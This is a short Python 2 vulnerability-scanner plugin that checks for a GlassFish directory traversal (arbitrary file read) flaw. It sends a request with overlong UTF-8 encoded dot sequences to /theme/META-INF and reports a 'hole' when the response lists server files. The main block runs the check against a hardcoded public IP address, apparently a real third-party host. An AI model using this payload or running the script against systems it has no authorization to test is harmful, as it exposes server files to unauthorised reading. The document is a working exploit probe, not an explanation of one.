#coding:utf-8
from t import T
import urllib2



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        vul_url = target_url + "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
        res=None
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except Exception,e:
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if "package-appclient.xml" in res_html:
            info = vul_url + "GlassFish File Read Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='GlassFish File Read  Vulnerability'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = 'hole'
        return result

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')       